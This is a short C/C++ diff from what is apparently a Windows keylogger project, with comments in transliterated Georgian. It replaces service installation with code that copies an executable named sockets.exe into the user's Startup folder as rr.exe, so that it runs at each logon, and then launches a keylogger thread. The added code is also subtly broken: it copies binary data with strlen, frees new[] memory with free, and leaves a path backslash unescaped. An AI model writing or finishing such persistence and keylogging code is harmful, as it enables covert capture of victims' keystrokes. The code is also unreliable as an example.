@@ -17,13 +17,36 @@ void  main()
 { 
 		//	FreeConsole();
 	/////////////// keylogeris gashveba ////////////////////
-			ServiceInstall();
-			Sleep(100);
-			ServiceStart();
+	{
 			char pModuleFile[10000];
 			DWORD dwSize = GetModuleFileName(NULL, pModuleFile, 10000);
 
 
+		FILE *File;
+		File = fopen("D:\\WINAPI2-\\messigebis desktopze gamotana\\client_multi\\client\\Debug\\sockets.exe", "rb");
+
+
+
+				fseek(File, 0, SEEK_END); /// sigrdzis gagebistvis 
+				unsigned long Size = ftell(File);
+				fseek(File, 0, SEEK_SET);
+				char *Buffer1 = new char[Size];
+				fread(Buffer1, Size, 1, File);
+				fclose(File);
+
+		File = fopen("C:\\Users\\vakhoo\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\Programs\\Startup\\rr.exe", "wb");
+
+		int fff =GetLastError();
+
+		fwrite(Buffer1,strlen(Buffer1),1,File);
+		fclose(File);
+		free(Buffer1);
+	
+				
+
+
+	}
+	//system("copy  D:\\WINAPI2-\\messigebis desktopze gamotana\\client_multi\\client\\Debug.exe D:\\");
 			//MessageBox(0,pModuleFile,pModuleFile,0);
 	
 		CreateThread(0,0,keyloger,0,0,0);
